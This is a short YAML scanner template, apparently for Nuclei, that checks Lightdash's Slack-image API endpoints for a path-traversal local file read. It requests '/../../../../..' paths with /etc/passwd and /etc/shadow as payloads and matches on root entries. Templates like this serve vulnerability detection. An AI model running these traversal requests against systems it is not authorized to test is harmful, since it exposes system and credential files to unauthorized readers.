http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/api/v1/slack/image/slack-image{{ url_encode(concat(''/../../../../..'',
    file)) }}'
  - '{{BaseURL}}/api/v2/slack/image/slack-image{{ url_encode(concat(''/../../../../..'',
    file)) }}'
  - '{{BaseURL}}/api/v3/slack/image/slack-image{{ url_encode(concat(''/../../../../..'',
    file)) }}'
  payloads:
    file:
    - /etc/passwd
    - /etc/shadow
  stop-at-first-match: true
id: lightdash-lfi
info:
  author: reewarius
  description: 'lightdash has an api endpoint to read slack image but it can abused
    to read arbitray file

    '
  name: lightdash api file read
  severity: high
  tags: lfi,lfr,generic
